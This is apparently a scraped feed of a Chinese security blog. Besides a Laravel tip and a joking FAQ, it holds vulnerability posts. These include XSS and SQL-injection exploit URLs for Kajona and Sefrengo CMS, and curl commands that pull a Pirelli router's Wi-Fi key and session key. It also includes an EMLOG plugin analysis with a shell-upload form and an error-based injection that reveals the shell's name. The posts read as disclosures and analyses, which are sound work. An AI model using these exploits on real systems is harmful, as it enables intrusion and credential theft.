<p>这里myPostInfo()用的是Camel命名规则，但是我们在读取某一个PostInfo的时候可以用Snake规则。如下面代码都是可行的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$post = MyPost::find(1);</div><div class="line">$post_info = $post-&gt;myPostInfo; // example 1</div><div class="line">$post_info = $post-&gt;my_post_info; // example 2</div><div class="line">Laravel允许上述两种方法，但是没有合理的处理使用两种命名造成的冲突。</div></pre></td></tr></table></figure>

<h2 id="缓存失效">缓存失效</h2>
<p>如果我们同时使用了上述两个例子，就会使其中一个缓存失效。在Model的relations变量中，缓存了已经读取过的关联Model，但是当我们用不同规则的名字去读取的时候，却会使得前一个缓存失效。例如</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$post_info = $post-&gt;myPostInfo; </div><div class="line">// $post-&gt;relations = [‘myPostInfo’ =&gt; ..];</div><div class="line"></div><div class="line">$post_info = $post-&gt;my_post_info;</div><div class="line">// $post-&gt;relations = [‘myPostInfo’ =&gt; …, ‘my_post_info’ =&gt; …];</div></pre></td></tr></table></figure>

<p>所以如果不希望缓存失效，得在项目中只使用一种命名方法去读取关系模型。Laravel推荐的是Camel Case.</p>
]]></content>
         
         
           
             
              <breadCrumb title="技术文章" url="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/faq.html</loc>
    <lastmod>2015-01-08T15:36:50.000Z</lastmod>
    <data>
        <display>
        <title>FAQ问答</title>
        <pubTime>2014-03-16T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<p><span class="label label-danger">Q</span> <code>路人甲：</code> 请做一下简单的自我介绍</p>
<p><span class="label label-success">A</span> <code>博主答：</code> 三无屌丝，十行代码五处BUG的奇葩青年</p>
<p><span class="label label-danger">Q</span> <code>路人甲：</code> 博主何须人也，有何爱好？</p>
<p><span class="label label-success">A</span> <code>博主答：</code> 为了以防被社工，我肯定不会说我是湖北的，爱好吗，你懂得</p>
<p><span class="label label-danger">Q</span> <code>路人甲：</code> 请问博主结婚了吗？</p>
<p><span class="label label-success">A</span> <code>博主答：</code> 吗的，信不信在问，我现在就拿西瓜刀捅死你</p>
<p><span class="label label-danger">Q</span> <code>路人甲：</code> 你的博客主要是干什么的呢？</p>
<p><span class="label label-success">A</span> <code>博主答：</code> 引导银河系的无知有机动物，走向幸福之巅，奴役全宇宙！</p>
<p><span class="label label-danger">Q</span> <code>路人甲：</code> 我要怎么才能联系到你了？</p>
<p><span class="label label-success">A</span> <code>博主答：</code> 邮件至：webmail@qq.com，或者添加QQ：190392070.</p>
]]></content>
         
         
           
             
              <breadCrumb title="关于博客" url="http://www.weshell.net/categories/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/kajona-cms-xss.html</loc>
    <lastmod>2015-01-07T13:24:02.000Z</lastmod>
    <data>
        <display>
        <title>Kajona CMS 4.6 跨站脚本漏洞</title>
        <pubTime>2014-01-07T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<p>XSS构造：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Exploit Examples:</div><div class="line"></div><div class="line">http://</div><div class="line">{TARGET}/index.php?admin=1&module=right&action=change%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--&changemodule=dashboard</div><div class="line"></div><div class="line">http://</div><div class="line">{TARGET}/index.php?admin=1&module=messaging&action=list%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--</div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/sefrengo-sql.html</loc>
    <lastmod>2015-01-07T13:15:12.000Z</lastmod>
    <data>
        <display>
        <title>Sefrengo CMS 1.6.0 SQL注入漏洞</title>
        <pubTime>2014-01-07T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<p>受影响的版本为：v.1.6.0</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">Exploit-Example:</div><div class="line"></div><div class="line">http://</div><div class="line">{TARGET}/backend/main.php?area=con_configcat&idcat=1'+and+'1'='2'+union+select+version(),user(),3,4+--+&idtplconf=0</div><div class="line"></div><div class="line">Another SQL-Injection vulnerability can be found in the administrative</div><div class="line">backend, where the admin can manage installed plugins. The vulnerable</div><div class="line">parameter is „idclient“ in the following URL:</div><div class="line"></div><div class="line">http://{TARGET}/backend/main.php?area=plug&idclient=1</div><div class="line"></div><div class="line">Exploit-Example:</div><div class="line"></div><div class="line">http://</div><div class="line">{TARGET}/backend/main.php?area=plug&idclient=1%27+and+%271%27=%272%27+union+select+1,version%28%29,user%28%29,4,database%28%29,6,7,8,9,10,11,12,13,14+--+</div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/pireli-adsl.html</loc>
    <lastmod>2015-01-07T13:11:10.000Z</lastmod>
    <data>
        <display>
        <title>Pirelli ADSL2/2+无线路由器信息披露</title>
        <pubTime>2014-01-07T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<p>影响版本：PDG_TEF_SP_4.06L.6<br>CVE-2015-0554</p>
<p>exploitit:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i "WLAN_"</div><div class="line">                  <span class="tag">&lt;<span class="title">option</span> <span class="attribute">value</span>=<span class="value">'0'</span>&gt;</span>WLAN_DEAD<span class="tag">&lt;/<span class="title">option</span>&gt;</span></div><div class="line"></div><div class="line">$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i "var wpapskkey"</div><div class="line">var wpaPskKey = 'IsAklFHhFFui1sr9ZMqD';</div><div class="line"></div><div class="line">$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i "var WscDevPin"</div><div class="line">var WscDevPin    = '12820078';</div><div class="line"></div><div class="line">$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i "var sessionkey"</div><div class="line">var sessionKey='1189641421';</div><div class="line"></div><div class="line">$ curl -s http://${IP_ADDRESS}/wlcfg.html | grep -i "bssid:" -A 3</div><div class="line">                     <span class="tag">&lt;<span class="title">td</span> <span class="attribute">width</span>=<span class="value">"50"</span>&gt;</span>BSSID:<span class="tag">&lt;/<span class="title">td</span>&gt;</span></div><div class="line">                     <span class="tag">&lt;<span class="title">td</span>&gt;</span></div><div class="line">                        DC:0B:1A:XX:XX:XX</div><div class="line">                     <span class="tag">&lt;/<span class="title">td</span>&gt;</span></div></pre></td></tr></table></figure>

<p>我们可以在源码中发现：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- hide</span></div><div class="line"></div><div class="line">var sessionKey='846930886';</div><div class="line">function btnReset() {</div><div class="line">   var loc = 'rebootinfo.cgi?';</div><div class="line"></div><div class="line">   loc += 'sessionKey=' + sessionKey;</div><div class="line"></div><div class="line">   var code = 'location="' + loc + '"';</div><div class="line">   eval(code);</div><div class="line">}</div><div class="line"></div><div class="line">// done hiding --&gt;</div><div class="line"></div><div class="line"></div><div class="line">http://${IP_ADDRESS}/rebootinfo.cgi?sessionKey=233665123</div><div class="line"></div><div class="line"></div><div class="line"># All the information what we can fetch from.</div><div class="line">#----------------------------------------------</div><div class="line">webs$ ls</div><div class="line">adslcfgadv.html       diagpppoe.html      ipv6lancfg.html    qoscls.html              statsatmreset.html</div><div class="line">adslcfgc.html         dlnacfg.html        js                 qosqmgmt.html            statsifc.html</div><div class="line">adslcfg.html          dnscfg.html         jsps               qosqueueadd.html         statsifcreset.html</div><div class="line">adslcfgtone.html      dnsproxycfg.html    lancfg2.html       qsmain.html              statsmocalanreset.html</div><div class="line">algcfg.html           dsladderr.html      languages          quicksetuperr.html       statsmocareset.html</div><div class="line">APIS                  dslbondingcfg.html  lockerror.html     quicksetup.html          statsmocawanreset.html</div><div class="line">atmdelerr.html        enblbridge.html     logconfig.html     quicksetuptesterr.html   statsvdsl.html</div><div class="line">backupsettings.html   enblservice.html    logintro.html      quicksetuptestsucc.html  statsvdslreset.html</div><div class="line">berrun.html           engdebug.html       logobkg.gif        rebootinfo.html          statswanreset.html</div><div class="line">berstart.html         ethadderr.html      logoc.gif          resetrouter.html         statsxtmreset.html</div><div class="line">berstop.html          ethdelerr.html      logo_corp.gif      restoreinfo.html         storageusraccadd.html</div><div class="line">certadd.html          footer.html         logo.html          routeadd.html            stylemain.css</div><div class="line">certcaimport.html     hlpadslsync.html    logomenu.gif       rtdefaultcfgerr.html     threeGPIN.html</div><div class="line">certimport.html       hlpatmetoe.html     main.html          rtdefaultcfg.html        todadd.html</div><div class="line">certloadsigned.html   hlpatmseg.html      menuBcm.js         scdmz.html               tr69cfg.html</div><div class="line">cfgatm.html           hlpethconn.html     menu.html          scinflt.html             updatesettings.html</div><div class="line">cfgeth.html           hlppngdns.html      menuTitle.js       scmacflt.html            upload.html</div><div class="line">cfgl2tpac.html        hlppnggw.html       menuTree.js        scmacpolicy.html         uploadinfo.html</div><div class="line">cfgmoca.html          hlppppoasess.html   mocacfg.html       scoutflt.html            upnpcfg.html</div><div class="line">cfgptm.html           hlppppoeauth.html   multicast.html     scprttrg.html            url_add.html</div><div class="line">colors.css            hlppppoeconn.html   natcfg2.html       scripts                  util.js</div><div class="line">config.json.txt       hlppppoeip.html     ntwksum2.html      scvrtsrv.html            wanadderr.html</div><div class="line">css                   hlptstdns.html      omcidownload.html  seclogintro.html         wancfg.html</div><div class="line">ddnsadd.html          hlpusbconn.html     omcisystem.html    snmpconfig.html          wlcfgadv.html</div><div class="line">defaultsettings.html  hlpwlconn.html      password.html      sntpcfg.html             wlcfg.html</div><div class="line">dhcpinfo.html         html                portmapadd.html    standby.html             wlcfgkey.html</div><div class="line">diag8021ag.html       ifcdns.html         portmapedit.html   StaticIpAdd.html         wlmacflt.html</div><div class="line">diagbr.html           ifcgateway.html     portName.js        StaticIpErr.html         wlrefresh.html</div><div class="line">diag.html             images              pppoe.html         statsadslerr.html        wlsecurity.html</div><div class="line">diagipow.html         index.html          pradd.html         statsadsl.html           wlsetup.html</div><div class="line">diaglan.html          info.html           ptmadderr.html     statsadslreset.html      wlwapias.html</div><div class="line">diagmer.html          ipoacfg.html        ptmdelerr.html     statsatmerr.html         xdslcfg.html</div><div class="line">diagpppoa.html        ippcfg.html         pwrmngt.html       statsatm.html</div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/emlog-sql-getshell.html</loc>
    <lastmod>2015-01-07T12:56:54.000Z</lastmod>
    <data>
        <display>
        <title>EMLOG相册插件SQL注入漏洞可GETshell</title>
        <pubTime>2015-01-07T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<p>emlog相册插件，几乎是emlog最早的插件之一，几乎有百分之75.3%的用户使用，可见此emlog相册插件SQL注入漏洞危害还是非常大的</p>
<p>我们来分析一下漏洞产生的原因：打开插件kl_album_ajax_do.php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> * kl_album_ajax_do.php</div><div class="line"> * design by KLLER</div><div class="line"> */</div><div class="line"><span class="keyword">require_once</span>(<span class="string">'../../../init.php'</span>);</div><div class="line"><span class="variable">$DB</span> = MySql::getInstance();</div><div class="line"><span class="variable">$kl_album_config</span> = unserialize(Option::get(<span class="string">'kl_album_config'</span>));</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'album'</span>]) && <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>])){</div><div class="line">        <span class="keyword">if</span>(function_exists(<span class="string">'ini_get'</span>)){</div><div class="line">                <span class="variable">$kl_album_memory_limit</span> = ini_get(<span class="string">'memory_limit'</span>);</div><div class="line">                <span class="variable">$kl_album_memory_limit</span> = substr(<span class="variable">$kl_album_memory_limit</span>, <span class="number">0</span>, strlen(<span class="variable">$kl_album_memory_limit</span>)-<span class="number">1</span>);</div><div class="line">                <span class="variable">$kl_album_memory_limit</span> = (<span class="variable">$kl_album_memory_limit</span>+<span class="number">20</span>).<span class="string">'M'</span>;</div><div class="line">                ini_set(<span class="string">'memory_limit'</span>, <span class="variable">$kl_album_memory_limit</span>);</div><div class="line">        }</div><div class="line">        define(<span class="string">'KL_UPLOADFILE_MAXSIZE'</span>, kl_album_get_upload_max_filesize());</div><div class="line">        define(<span class="string">'KL_UPLOADFILE_PATH'</span>, <span class="string">'../../../content/plugins/kl_album/upload/'</span>);</div><div class="line">        define(<span class="string">'KL_IMG_ATT_MAX_W'</span>,        <span class="number">100</span>);<span class="comment">//图片附件缩略图最大宽</span></div><div class="line">        define(<span class="string">'KL_IMG_ATT_MAX_H'</span>,        <span class="number">100</span>);<span class="comment">//图片附件缩略图最大高</span></div><div class="line">        <span class="variable">$att_type</span> = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'png'</span>, <span class="string">'gif'</span>);<span class="comment">//允许上传的文件类型</span></div><div class="line">        <span class="variable">$album</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'album'</span>]) ? intval(<span class="variable">$_POST</span>[<span class="string">'album'</span>]) : <span class="string">''</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'error'</span>] != <span class="number">4</span>){</div><div class="line">                <span class="variable">$upfname</span> = kl_album_upload_file(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'name'</span>], <span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'error'</span>], <span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'tmp_name'</span>], <span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'size'</span>], <span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'type'</span>], <span class="variable">$att_type</span>);</div><div class="line">                <span class="variable">$photo_size</span> = chImageSize(EMLOG_ROOT.substr(<span class="variable">$upfname</span>, <span class="number">2</span>), KL_IMG_ATT_MAX_W, KL_IMG_ATT_MAX_H);</div><div class="line">                <span class="variable">$result</span> = <span class="variable">$DB</span><span class="variable">-&gt;query</span>(<span class="string">"INSERT INTO "</span>.DB_PREFIX.<span class="string">"kl_album(truename, filename, description, album, addtime, w, h) VALUES('{$_FILES['Filedata']['name']}', '{$upfname}', '"</span>.date(<span class="string">'Y-m-d'</span>, time()).<span class="string">"', {$album}, "</span>.time().<span class="string">", {$photo_size['w']}, {$photo_size['h']})"</span>);</div><div class="line">                <span class="keyword">if</span>(<span class="variable">$result</span>){</div><div class="line">                        <span class="variable">$new_id</span> = <span class="variable">$DB</span><span class="variable">-&gt;insert_id</span>();</div><div class="line">                        <span class="variable">$the_option_value</span> = Option::get(<span class="string">'kl_album_'</span>.<span class="variable">$album</span>);</div><div class="line">                        <span class="keyword">if</span>(<span class="variable">$the_option_value</span> !== <span class="keyword">null</span>){</div><div class="line">                                <span class="variable">$the_option_value</span> = trim(<span class="variable">$new_id</span>.<span class="string">','</span>.<span class="variable">$the_option_value</span>, <span class="string">','</span>);</div><div class="line">                                Option::updateOption(<span class="string">'kl_album_'</span>.<span class="variable">$album</span>, <span class="variable">$the_option_value</span>);</div><div class="line">                                <span class="variable">$CACHE</span><span class="variable">-&gt;updateCache</span>(<span class="string">'options'</span>);</div><div class="line">                        }</div><div class="line">                }</div><div class="line">        }</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">}</div><div class="line"><span class="keyword">if</span>(ROLE != <span class="string">'admin'</span>) <span class="keyword">exit</span>(<span class="string">'access deined!'</span>);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'action'</span>]) && <span class="variable">$_GET</span>[<span class="string">'action'</span>]!=<span class="string">''</span>){...</div></pre></td></tr></table></figure>

<p>可以看到在倒数第二行验证身份的代码在上传的代码后面，所以任意用户均可上传文件。那么我们来看看上传部分。里面似乎定义了一个$att_type = array(‘jpg’, ‘jpeg’, ‘png’, ‘gif’);，并将$att_type这个变量和$_FILES一起传入了kl_album_upload_file函数。我们进去看看：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">kl_album_upload_file</span><span class="params">(<span class="variable">$filename</span>, <span class="variable">$errorNum</span>, <span class="variable">$tmpfile</span>, <span class="variable">$filesize</span>, <span class="variable">$filetype</span>, <span class="variable">$type</span>, <span class="variable">$isIcon</span> = <span class="number">0</span>)</span></span>{</div><div class="line">        <span class="variable">$kl_album_config</span> = unserialize(Option::get(<span class="string">'kl_album_config'</span>));</div><div class="line">        <span class="variable">$extension</span>  = strtolower(substr(strrchr(<span class="variable">$filename</span>, <span class="string">"."</span>),<span class="number">1</span>));</div><div class="line">        <span class="variable">$uppath</span> = KL_UPLOADFILE_PATH . date(<span class="string">"Ym"</span>) . <span class="string">"/"</span>;</div><div class="line">        <span class="variable">$fname</span> = md5(<span class="variable">$filename</span>) . date(<span class="string">"YmdHis"</span>) . rand() .<span class="string">'.'</span>. <span class="variable">$extension</span>;</div><div class="line">        <span class="variable">$attachpath</span> = <span class="variable">$uppath</span> . <span class="variable">$fname</span>;</div><div class="line">        <span class="keyword">if</span>(!is_dir(KL_UPLOADFILE_PATH)){</div><div class="line">                umask(<span class="number">0</span>);</div><div class="line">                <span class="variable">$ret</span> = @mkdir(KL_UPLOADFILE_PATH, <span class="number">0777</span>);</div><div class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span> === <span class="keyword">false</span>) <span class="keyword">return</span> <span class="string">'创建文件上传目录失败'</span>;</div><div class="line">        }</div><div class="line">        <span class="keyword">if</span>(!is_dir(<span class="variable">$uppath</span>)){</div><div class="line">                umask(<span class="number">0</span>);</div><div class="line">                <span class="variable">$ret</span> = @mkdir(<span class="variable">$uppath</span>, <span class="number">0777</span>);</div><div class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span> === <span class="keyword">false</span>) <span class="keyword">return</span> <span class="string">"上传失败。文件上传目录(content/plugins/kl_album/upload)不可写"</span>;</div><div class="line">        }</div><div class="line">        doAction(<span class="string">'kl_album_upload'</span>, <span class="variable">$tmpfile</span>);</div><div class="line">        <span class="comment">//缩略</span></div><div class="line">        <span class="variable">$imtype</span> = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'jpeg'</span>,<span class="string">'gif'</span>);</div><div class="line">        <span class="variable">$thum</span> = <span class="variable">$uppath</span>.<span class="string">"thum-"</span>. <span class="variable">$fname</span>;</div><div class="line">        <span class="variable">$attach</span> = in_array(<span class="variable">$extension</span>, <span class="variable">$imtype</span>) && function_exists(<span class="string">"ImageCreate"</span>) && kl_album_resize_image(<span class="variable">$tmpfile</span>,<span class="variable">$filetype</span>,<span class="variable">$thum</span>,<span class="variable">$isIcon</span>,KL_IMG_ATT_MAX_W,KL_IMG_ATT_MAX_H) ? <span class="variable">$thum</span> : <span class="variable">$attachpath</span>;</div><div class="line">        <span class="variable">$kl_album_compression_length</span> = <span class="keyword">isset</span>(<span class="variable">$kl_album_config</span>[<span class="string">'compression_length'</span>]) ? intval(<span class="variable">$kl_album_config</span>[<span class="string">'compression_length'</span>]) : <span class="number">1024</span>;</div><div class="line">        <span class="variable">$kl_album_compression_width</span> = <span class="keyword">isset</span>(<span class="variable">$kl_album_config</span>[<span class="string">'compression_width'</span>]) ? intval(<span class="variable">$kl_album_config</span>[<span class="string">'compression_width'</span>]) : <span class="number">768</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$kl_album_compression_length</span> == <span class="number">0</span> || <span class="variable">$kl_album_compression_width</span> == <span class="number">0</span>){</div><div class="line">                <span class="keyword">if</span>(@is_uploaded_file(<span class="variable">$tmpfile</span>)){</div><div class="line">                        <span class="keyword">if</span>(@!move_uploaded_file(<span class="variable">$tmpfile</span> ,<span class="variable">$attachpath</span>)){</div><div class="line">                                @unlink(<span class="variable">$tmpfile</span>);</div><div class="line">                                <span class="keyword">return</span> <span class="string">"上传失败。文件上传目录(content/plugins/kl_album/upload)不可写"</span>;</div><div class="line">                        }<span class="keyword">else</span>{</div><div class="line">                                <span class="keyword">echo</span> <span class="string">'kl_album_successed'</span>;</div><div class="line">                        }</div><div class="line">                        chmod(<span class="variable">$attachpath</span>, <span class="number">0777</span>);</div><div class="line">                }</div><div class="line">        }<span class="keyword">else</span>{</div><div class="line">                <span class="keyword">if</span>(in_array(<span class="variable">$extension</span>, <span class="variable">$imtype</span>) && function_exists(<span class="string">"ImageCreate"</span>) && kl_album_resize_image(<span class="variable">$tmpfile</span>,<span class="variable">$filetype</span>,<span class="variable">$attachpath</span>,<span class="variable">$isIcon</span>,<span class="variable">$kl_album_compression_length</span>,<span class="variable">$kl_album_compression_width</span>)){</div><div class="line">                        <span class="keyword">echo</span> <span class="string">'kl_album_successed'</span>;</div><div class="line">                }<span class="keyword">else</span>{</div><div class="line">                        <span class="keyword">if</span>(@is_uploaded_file(<span class="variable">$tmpfile</span>)){</div><div class="line">                                <span class="keyword">if</span>(@!move_uploaded_file(<span class="variable">$tmpfile</span> ,<span class="variable">$attachpath</span>)){</div><div class="line">                                        @unlink(<span class="variable">$tmpfile</span>);</div><div class="line">                                        <span class="keyword">return</span> <span class="string">"上传失败。文件上传目录(content/plugins/kl_album/upload)不可写"</span>;</div><div class="line">                                }<span class="keyword">else</span>{</div><div class="line">                                        <span class="keyword">echo</span> <span class="string">'kl_album_successed'</span>;</div><div class="line">                                }</div><div class="line">                                chmod(<span class="variable">$attachpath</span>, <span class="number">0777</span>);</div><div class="line">                        }</div><div class="line">                }</div><div class="line">        }</div><div class="line">        <span class="variable">$attach</span> = substr(<span class="variable">$attach</span>, <span class="number">6</span>, strlen(<span class="variable">$attach</span>));</div><div class="line">        <span class="keyword">return</span>         <span class="variable">$attach</span>;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>这里可以看到，实际上我们传入的$type变量在这个函数里根本没有用到！函数中定义了一个$imtype = array(‘jpg’,’png’,’jpeg’,’gif’);，也不是用来验证后缀的，而是判断是否需要生成缩略图的。所以重点就是下面几行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$extension</span>  = strtolower(substr(strrchr(<span class="variable">$filename</span>, <span class="string">"."</span>),<span class="number">1</span>));</div><div class="line"><span class="variable">$uppath</span> = KL_UPLOADFILE_PATH . date(<span class="string">"Ym"</span>) . <span class="string">"/"</span>;</div><div class="line"><span class="variable">$fname</span> = md5(<span class="variable">$filename</span>) . date(<span class="string">"YmdHis"</span>) . rand() .<span class="string">'.'</span>. <span class="variable">$extension</span>;</div><div class="line"><span class="variable">$attachpath</span> = <span class="variable">$uppath</span> . <span class="variable">$fname</span>;</div></pre></td></tr></table></figure>

<p>在这可以看到上传的文件名是md5($filename) . date(“YmdHis”) . rand() .’.’. $extension;，原名的md5值+时间+rand随机数+后缀。md5值和时间基本比较好确定的，但是rand()随机数一般都有65535个可能性。<br>而且我们看到后面的代码，并没有把文件名输出的地方，只是echo ‘kl_album_successed’;。难道需要用字典暴力跑shell名字？我们返回kl_album_ajax_do.php，可以发现上传的if语句中有如下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$result = $DB-&gt;query("INSERT INTO ".DB_PREFIX."kl_album(truename, filename, description, alb</div></pre></td></tr></table></figure>

<p>将$_FILES[‘Filedata’][‘name’]直接插入数据库。这里另造成了一个SQL注入漏洞，当然既然有之前的getshell，这里的注入就有点当陪衬了。不过emlog在遇到SQL语句出错的情况下是会报错的。所以所以，这里我们正好用到这个特性，通过报错可以将$upfname这个字段爆出来，这也就是我们上传成功的shell名字。如何报错？上传文件名里加个单引号即可。</p>
<p>我们来写一个表单：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;form id=<span class="string">"exp"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">&lt;p&gt;target url &gt; &lt;input id=<span class="string">"url"</span> type=<span class="string">"text"</span> style=<span class="string">"width: 300px"</span>&gt;&lt;/p&gt;</div><div class="line">&lt;p&gt;shell file &gt; &lt;input type=<span class="string">"file"</span> name=<span class="string">"Filedata"</span>&gt;&lt;/p&gt;</div><div class="line">&lt;input name=<span class="string">"album"</span> type=<span class="string">"hidden"</span> value=<span class="string">"111111"</span> &gt;</div><div class="line">&lt;p&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"GO!"</span> onclick=<span class="string">"exp.action=url.value+'/content/plugins/kl_album/kl_album_ajax_do.php';"</span>&gt;&lt;/p&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>

<p>我们看截图，已经爆出来了<br><img src="http://dn-wwweshell.qbox.me/emlogxx.png" alt="emlog相册插件漏洞"></p>
<p>没有升级插件的小伙伴们赶紧升级一下吧。</p>
]]></content>
         
         
           
             
